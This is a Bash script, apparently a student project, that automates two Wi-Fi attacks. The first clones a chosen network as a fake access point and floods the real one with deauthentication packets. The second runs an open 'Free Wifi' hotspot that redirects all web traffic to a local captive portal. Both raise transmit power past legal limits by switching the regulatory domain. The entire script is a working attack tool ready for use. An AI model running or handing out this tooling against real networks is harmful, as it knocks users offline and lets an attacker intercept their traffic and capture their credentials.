#-----------Log Files-------------------------#
touch /tmp/log.txt
LOG_FILE=/tmp/log.txt
touch /tmp/HOSTAPD.txt
LOG_HOSTAPD=/tmp/HOSTAPD.txt
touch /tmp/DNS.txt
LOG_DNS=/tmp/DNS.txt
touch /tmp/DNSPOOF.txt
SPOOF=/tmp/DNSPOOF.txt
#------------Variables------------------------#
INTERFACE1=$(ifconfig |grep n1 |cut -d ":" -f1)
INTERFACE2=$(ifconfig |grep n2 |cut -d ":" -f1)
CHANNEL=11
GATEWAY=10.0.0.1
MONITOR1=$(ifconfig |grep 1mon |cut -d ":" -f1)
MONITOR2=$(ifconfig |grep 2mon |cut -d ":" -f1)

#-----------------------------------------------#

#---------Installation-and-update----------------------------------------------#
echo -e "\033[31mBefore the script begun we install some tools, like aircrack-ng ,hostapd,dnsmasq\033[0m"

apt-get install aircrack-ng -y  &>>/dev/null
apt-get install hostapd -y &>>/dev/null
apt-get install dnsmasq -y &>>/dev/null
apt-get install update -y &>>/dev/null


#---------Check-the-interface-state---------------------------------#

ifconfig $INTERFACE1 up
ifconfig $INTERFACE2 up


ifconfig $MONITOR1 down &>>/dev/null
iwconfig $MONITOR1 mode monitor &>>/dev/null
ifconfig $MONITOR1 up &>>/dev/null
airmon-ng stop $MONITOR1 &>>/dev/null

ifconfig $MONITOR2 down &>>/dev/null
iwconfig $MONITOR2 mode monitor &>>/dev/null
ifconfig $MONITOR2 up &>>/dev/null
airmon-ng stop $MONITOR2 &>>/dev/null


ifconfig $INTERFACE1 up
ifconfig $INTERFACE2 up


#-------------------------------------------------------------------------------#

echo -e "\033[33mWelcome to our annual project , choose what you want to do\033[0m : "

echo -e "\n"

echo -e "\033[32m1.Deauthentication Attack\033[0m"
echo -e "\033[32m2.Create a wifi with captive portal\033[0m"

echo -e "\n"

echo -e "\033[34mChoose a option :\033[0m "
read choice
  if [ $choice -eq 1 ]
#--------------First-Choice-----------------------------------------------------#

then
echo -e "\033[31mYOU CHOOSE DEAUTHENTICATION ATTACK !\033[0m"

airmon-ng check kill &>> /dev/null
airmon-ng check kill &>> /dev/null

INTERFACE1=$(ifconfig |grep n1 |cut -d ":" -f1)
INTERFACE2=$(ifconfig |grep n2 |cut -d ":" -f1)

ifconfig $INTERFACE1 up
ifconfig $INTERFACE2 up

INTERFACE1=$(ifconfig |grep n1 |cut -d ":" -f1)
INTERFACE2=$(ifconfig |grep n2 |cut -d ":" -f1)


airmon-ng start $INTERFACE2 &>> $LOG_FILE

MONITOR1=$(ifconfig |grep 1mon |cut -d ":" -f1)
MONITOR2=$(ifconfig |grep 2mon |cut -d ":" -f1)


#Just a verification for see if the interface are mount
echo "The first interface for monitor mode is -->"$MONITOR2
echo "The first interface for Deauth is -->"$INTERFACE1
sleep 2;

airodump-ng $INTERFACE1

echo -e "\033[34mChoose the BSSID of the network to copy :\033[0m"
read BSSID
echo -e "\033[34mEnter the ESSID of the network :\033[0m"
read ESSID
echo -e "\033[34mAlso the channel :\033[0m"
read CHANNEL

echo -e "\n"
echo -e "\033[34mYour choose the network :"$ESSID","$BSSID","$CHANNEL "nice choice\033[0m"


ifconfig $MONITOR2 up $GATEWAY netmask 255.255.255.0

killall network-manager dnsmasq wpa_supplicant dhcpcd &>> /dev/null

touch hostapd.conf
echo "
interface=$MONITOR2
driver=nl80211
ssid=$ESSID
hw_mode=g
channel=$CHANNEL
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
" > /root/fakeap/hostapd.conf

touch dnsmasq.conf
echo "
interface=$MONITOR2
dhcp-range=10.0.0.10,10.0.0.50,255.255.255.0,24h
dhcp-option=3,$GATEWAY
dhcp-option=6,$GATEWAY
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
" > /root/fakeap/dnsmasq.conf


#Increase power of the card :

echo -e "\033[33mPlease wait the power of the wifi card increased\033[0m"

iw reg set BZ
ip link set $MONITOR2 down
iw dev $MONITOR2 set txpower fixed 30mBm
ip link set $MONITOR2 up

iw reg set BZ
ip link set $INTERFACE1 down
iw dev $INTERFACE1 set txpower fixed 30mBm
ip link set $INTERFACE1 up

sleep 5;


echo -e "\033[33mThe power is now increased :)\033[0m"

echo -e "\n"

echo -e "\033[31mThe fake  access point starting\033[0m"

hostapd /root/fakeap/hostapd.conf &>> $LOG_HOSTAPD &
sleep 5;
dnsmasq -C /root/fakeap/dnsmasq.conf -d &>> $LOG_DNS &

echo 1 > /proc/sys/net/ipv4/ip_forward

iptables --flush && iptables --table nat --flush && iptables --delete-chain && iptables --table nat --delete-chain

iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan1mon -j ACCEPT

sleep 5;


echo -e "\033[31mDeauth starting...\033[0m"
xterm -hold -e "airodump-ng -c $CHANNEL $INTERFACE1" &
sleep 1;
xterm -hold -e "aireplay-ng -00 -a $BSSID $INTERFACE1" &

#--------------------SECOND-CHOICE--------------------------------------------------------------------#

elif [ $choice -eq 2 ]
     then

echo -e "\033[32mWELCOME TO THE CAPTIVE PORTAL\033[0m"

ifconfig $MONITOR1 down &>>/dev/null
iwconfig $MONITOR1 mode monitor &>>/dev/null
ifconfig $MONITOR1 up &>>/dev/null
airmon-ng stop $MONITOR1 &>>/dev/null

sleep 1;
ifconfig wlan1 up


INTERFACE1=$(ifconfig |grep n0 |cut -d ":" -f1)

echo -e  "\n"



#-----------Installation and update-------------------------

echo -e "\033[34mInstallation of some tools and update the machine\033[0m"

apt-get update &>>/dev/null
apt-get install hostapd dnsmasq apache2 -y &>>/dev/null

echo -e "\033[34mKilling some annoying process\033[0m"

killall network-manager wpa_supplicant dnsmasq &>>/dev/null

airmon-ng check kill &>>/dev/null
airmon-ng check kill &>>/dev/null
#-------------------------------------------------------------
#-----------Airmon-ng-----------------------------------------
INTERFACE1=$(ifconfig |grep n1 |cut -d ":" -f1)

#echo "Interface 1 = "$INTERFACE1
sleep 1;

ifconfig $INTERFACE1 down
iwconfig $INTERFACE1 mode managed
ifconfig $INTERFACE1 up

sleep 2;
airmon-ng start $INTERFACE1 &>>/dev/null
sleep 3;


#echo "Monitor mode interface is  -->" $MONITOR1

sleep 2;

MONITOR1=$(ifconfig |grep 1mon |cut -d ":" -f1)

#echo "Monitor mode interface is  -->" $MONITOR1

sleep 2;
ifconfig $MONITOR1 up $GATEWAY netmask 255.255.255.0

echo -e "\033[33mPlease wait the power of the wifi card increased\033[0m"

iw reg set BZ
ip link set $MONITOR1 down
iw dev $MONITOR1 set txpower fixed 30mBm
ip link set $MONITOR1 up

#-----------Service-------------------------------------------

echo -e  "\033[31mApache2 and Hostapd are start up...\033[0m"

service apache2 start &>>/dev/null

MONITOR1=$(ifconfig |grep 1mon |cut -d ":" -f1)

ifconfig wlan1mon up
#-----------------Push-hostapd-and-dnsmasq-conf--------------
touch hostapd.conf
echo "
interface=$MONITOR1
driver=nl80211
ssid=Free Wifi
hw_mode=g
channel=$CHANNEL
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
" > /root/captive/hostapd.conf

touch dnsmasq.conf
echo "
interface=$MONITOR1
dhcp-range=10.0.0.10,10.0.0.50,255.255.255.0,24h
dhcp-option=3,$GATEWAY
dhcp-option=6,$GATEWAY
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1


" > /root/captive/dnsmasq.conf

#-------------------------------------------------------------------

echo -e "\033[31mThe fake access point start up\033[0m"

hostapd /root/captive/hostapd.conf &>> $LOG_HOSTAPD &
sleep 5;
dnsmasq -C /root/captive/dnsmasq.conf -d &>> $LOG_DNS &


echo -e "\033[34mDelete iptables rules\033[0m"

iptables --flush && iptables --table nat --flush && iptables --delete-chain && iptables --table nat --delete-chain

echo -e "\033[34mNew Rules for redirection to a captive portal\033[0m"

iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan1mon -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
iptables -t nat -A POSTROUTING -j MASQUERADE

#echo 1 > /proc/sys/net/ipv4/ip_forward
a2enmod rewrite &>> /dev/null
service apache2 reload &>> /dev/null


fi
